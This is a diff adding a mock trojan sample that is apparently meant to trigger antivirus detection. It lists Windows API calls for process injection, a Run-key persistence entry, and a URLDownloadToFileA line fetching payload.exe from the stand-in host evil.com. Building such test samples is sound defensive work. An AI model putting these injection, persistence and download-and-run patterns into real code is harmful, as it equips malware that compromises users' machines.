@@ -1,0 +1,24 @@
+# FAKE VIRUS SAMPLE - TROJAN
+# THIS IS A SAFE TEST FILE FOR TESTING ANTIVIRUS SOFTWARE
+# NOT A REAL MALWARE - GENERATED FOR EDUCATIONAL PURPOSES ONLY
+
+THREAT_TYPE: TROJAN
+GENERATED: 2024-01-15
+RANDOM_ID: FAKE_TROJAN_001
+
+[MALICIOUS_INDICATORS]
+CreateRemoteThread(NULL, hProcess, 0, lpStartAddress, 0, 0, &dwThreadId)
+WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, NULL)
+VirtualAllocEx(hProcess, lpAddress, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+RegSetValueExA(hKey, "Run", 0, REG_SZ, "C:\\Temp\\malware.exe", 20)
+URLDownloadToFileA(NULL, "http://evil.com/payload.exe", "payload.exe", 0, NULL)
+
+[SIGNATURE]
+Trojan.Win32.Generic
+Backdoor.Agent.Trojan
+Malware.Dropper.Generic
+
+[MOCK_BEHAVIOR]
+This file simulates trojan behavior by containing known malicious patterns.
+When analyzed, it should be detected as MALICIOUS.
+DO NOT EXECUTE - THIS IS A TEST FILE ONLY.
